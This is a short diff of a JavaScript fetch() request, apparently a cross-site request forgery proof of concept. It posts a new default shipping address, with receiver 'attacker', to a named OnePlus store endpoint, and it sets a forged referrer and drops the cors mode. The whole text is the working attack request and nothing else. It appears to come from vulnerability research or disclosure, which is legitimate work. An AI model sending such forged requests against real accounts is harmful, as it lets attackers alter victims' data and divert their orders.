@@ -11,6 +11,5 @@ fetch("https://store.oneplus.com/xman/useraddress/add", {
     },
     "referrer": "https://my.oneplus.com/cn/address",
     "body": "-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"cityId\"\r\n\r\n1101\r\n-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"receiver\"\r\n\r\nattacker\r\n-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"regionId\"\r\n\r\n11\r\n-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"areaId\"\r\n\r\n110101\r\n-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"streetId\"\r\n\r\n110101001\r\n-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"street2\"\r\n\r\nattacker address\r\n-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n11111111111\r\n-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"isDefault\"\r\n\r\n1\r\n-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"countryCode\"\r\n\r\ncn\r\n-----------------------------282179177018731421611574570221--\r\n",
-    "method": "POST",
-    "mode": "cors"
+    "method": "POST"
 });
